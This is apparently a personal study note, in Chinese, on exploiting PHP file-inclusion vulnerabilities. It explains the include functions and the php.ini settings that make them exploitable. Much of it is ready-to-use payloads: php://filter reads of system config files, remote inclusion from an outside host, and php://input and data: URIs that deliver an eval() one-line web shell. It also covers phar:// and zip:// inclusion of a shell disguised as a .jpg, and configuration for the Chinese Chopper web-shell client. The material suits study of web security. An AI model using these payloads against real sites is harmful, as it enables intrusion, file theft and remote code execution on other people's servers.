WEB安全 文件包含
Lastmod: 2020-01-20

学习笔记，总结一些文件包含漏洞利用。

两个条件

  • 用户能够控制文件内容
  • include()等函数通过动态变量的方式引入需要包含的文件

​

特征函数

  • include（错误继续执行）、 require（错误后终止）

    include($_GET['file']);

    http://127.0.0.1/upload/include.php?file=http://go1f.cc/p.txt&a=phpinfo();

  • require_once 、include_once

  • highlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()

​

关键php.ini参数分析

allow_url_include 自php5.2 默认关闭

此选项允许有以下功能include，include_once，require，require_once使用URL的fopen封装。Whether to allow include/require to open URLs (like http:// or ftp://) as files.

This setting requires allow_url_fopen to be on. //需要allow_url_fopen开启才能开启

allow_url_fopen 自php5.2 默认开启

Whether to allow the treatment of URLs (like http:// or ftp://) as files.

限制 fopen， file_get_contents使用

PS:

fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。

include会包含进入代码内，再解析执行一次。

使用open_basedir 来限制哪些目录可以被 PHP 使用

​

不能通过.htaccess修改以上两个php_flag型的配置

参见 Where a configuration setting may be set

‘allow_url_include’ is a ‘PHP_INI_SYSTEM’ directive and hence cannot be set with the mod_php5 ‘php_flag’.

伪协议

php支持的协议和封装协议

file:///协议

只能使用绝对路径

file:///<绝对路径>

​

php://filter

读取敏感文件、base64转换读取代码、联动图片马等等。

- 对本地文件进行读写

无使用条件: allow_url_fopen/allow_url_include on/off，可使用相对/绝对路径

payload

include.php?file=php://filter/resource=/etc/php5/apache2/php.ini

#base64编码 convert.base64-encode
include.php?file=php://filter/read=convert.base64-encode/resource=/etc/php5/apache2/php.ini

更多字符操作函数 read=string.toupper、tolower、rot13、strip_tags

拓展： 谈一谈php://filter的妙用

​

- 远程文件读取

需要allow_url_include on 和 allow_url_fopen on

include.php?file=php://filter/resource=http://go1f.cc:8000/info.txt

​

php://input

条件 allow_url_include on

Payload

post内容填写一句话，非键值对形式

POST /include.php?file=php://input HTTP/1.1
Host: kokoisko.xyz:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
。。。
。。。

<?php @eval($_POST(a));?>

联动菜刀

配置栏填写：
<O><?php @eval($_POST[a]);?></O>

​

data:协议

条件 allow_url_fopen on && allow_url_include on

格式

data:[<mime type>][;charset=][;base64],<encoded data>

Payload

include.php?file=data:text/plain,<?php eval($_POST[a]);?>
#或者base64编码
include.php?file=data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyAgPz4=

​

渗透境界：

无文件 input、data

无进程 进程注入

无端口 icmp

​

phar://协议

读取tar/zip包内的文件。

借助对压缩包文件的允许上传，也可以将后缀改为jpg等，绕过后缀检测（无碍phar协议使用）。

条件 PHP>=5.3.0，支持tar/zip，相对路径/绝对路径

Payload

test.php?filename=phar://<zipfile.zip>/[<dir>/]<filename>

​

zip://协议

条件 相对路径/绝对路径皆可

压缩包不要求zip后缀，可以修改为jpg等后缀

格式

zip://绝对路径#[<dirname>/]<filename.txt>

Payload

include.php?file=zip://C:/phpstudy_pro/WWW/shell.jpg%23shell.php

注意：#在url为截断结束符，发送url编码%23代替

​

类似协议

compress.bzip2://

compress.zlib://
